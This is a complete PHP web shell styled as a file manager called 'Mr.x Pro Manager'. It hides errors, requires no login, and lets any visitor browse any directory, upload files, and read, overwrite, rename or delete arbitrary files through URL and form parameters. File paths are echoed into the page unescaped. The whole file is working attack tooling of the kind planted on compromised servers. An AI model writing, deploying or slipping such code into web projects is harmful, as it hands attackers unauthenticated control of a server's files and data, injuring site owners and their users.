<?php
error_reporting(0);
set_time_limit(0);

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();

?>
<!DOCTYPE html>
<html>
<head>
<title>Mr.x Pro Manager</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>

body{
background:#0d1117;
color:#c9d1d9;
font-family:Arial;
}

.container{
width:95%;
margin:auto;
}

.header{
background:#161b22;
padding:15px;
border-radius:5px;
margin-bottom:15px;
}

.btn{
background:#238636;
color:white;
padding:7px 15px;
border:none;
border-radius:3px;
cursor:pointer;
}

.btn:hover{
background:#2ea043;
}

input, textarea{
background:#0d1117;
color:#c9d1d9;
border:1px solid #30363d;
padding:7px;
width:100%;
}

.file{
padding:8px;
border-bottom:1px solid #30363d;
}

a{
color:#58a6ff;
text-decoration:none;
}

a:hover{
color:white;
}

</style>

</head>

<body>

<div class="container">

<div class="header">
<h2>Mr.x Pro Manager</h2>
Path: <?php echo $path; ?>
</div>

<?php

/* Upload */

if(isset($_FILES['file'])){
    
$upload = $path."/".$_FILES['file']['name'];

if(move_uploaded_file($_FILES['file']['tmp_name'],$upload)){
echo "Upload Success<br>";
}else{
echo "Upload Failed<br>";
}

}

?>

<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<br><br>
<input type="submit" class="btn" value="Upload">
</form>

<hr>

<?php

/* Delete */

if(isset($_GET['delete'])){
unlink($_GET['delete']);
echo "Deleted";
}

/* Rename */

if(isset($_POST['rename'])){
rename($_POST['old'],$_POST['new']);
echo "Rename Done";
}

/* Save Edit */

if(isset($_POST['save'])){

$file = $_POST['file'];
$content = $_POST['content'];

$fp = fopen($file,"w");
fwrite($fp,$content);
fclose($fp);

echo "Saved Successfully";
}

$files = scandir($path);

foreach($files as $file){

$file_path = $path."/".$file;

echo "<div class='file'>
<a href='?path=$file_path'>$file</a>

| <a href='?edit=$file_path'>Edit</a>

| <a href='?rename=$file_path'>Rename</a>

| <a href='?delete=$file_path'>Delete</a>

</div>";

}

/* Edit */

if(isset($_GET['edit'])){

$file = $_GET['edit'];
$content = htmlspecialchars(file_get_contents($file));

echo "

<hr>

<h3>Edit File</h3>

<form method='post'>

<textarea name='content' style='height:400px;'>$content</textarea>

<input type='hidden' name='file' value='$file'>

<br><br>

<input type='submit' name='save' class='btn' value='Save'>

</form>

";

}

/* Rename */

if(isset($_GET['rename'])){

$file = $_GET['rename'];

echo "

<hr>

<h3>Rename</h3>

<form method='post'>

Old Name

<input type='text' name='old' value='$file'>

New Name

<input type='text' name='new'>

<br><br>

<input type='submit' name='rename' class='btn' value='Rename'>

</form>

";

}

?>

</div>

</body>
</html>
